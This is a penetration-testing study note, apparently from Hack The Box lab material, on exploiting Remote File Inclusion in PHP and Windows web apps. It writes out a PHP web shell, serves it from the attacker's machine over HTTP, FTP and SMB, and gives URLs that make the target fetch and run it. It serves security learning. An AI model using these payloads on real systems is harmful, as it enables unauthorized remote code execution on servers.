---
title: b-RFI
draft: false
tags:
  - rfi
---
**Remote File Inclusion (RFI)** is where a web app allows the inclusion of remote URLs.

RFI got two benefits:

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

If we refer to the table on the first section, we see that the following are some of the functions that (if vulnerable) would allow RFI:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|
As we can see, almost any RFI vulnerability is also an LFI vulnerability.

However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:

1. The vulnerable function may not allow including remote URLs
2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

## Verify RFI

In modern web apps, remote URL inclusion is usually disabled by default.

Any remote URL inclusion in PHP requires `allow_url_include` setting is enabled.

Let's check on this by reading PHP configuration file using LFI and decoding it as how we did before:

```shell-session
jadu101@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

However, this doesn't determine RFI since the vulnerable function may not allow remote URL.

Best way to try including remote URL and see if we can get its content.

Start with local URL such as `http://127.0.0.1:80/index.php`.


## RCE w RFI

Let's create reverse shell with PHP:

```shell-session
jadu101@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now, we can start a server on our machine with a basic python server with the following command, as follows:

```shell-session
jadu101@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

We can execute commands using the following link:

```URL
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```


### FTP

We may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:

```shell-session
jadu101@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF.

We can execute commands as such:

```URL
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

```shell-session
jadu101@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### SMB

If the vulnerable web app is on Windows, we don't need `allow_url_include` setting to be enabled because we can use the SMB protocol for RFI.

We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:

```shell-session
jadu101@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:

```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```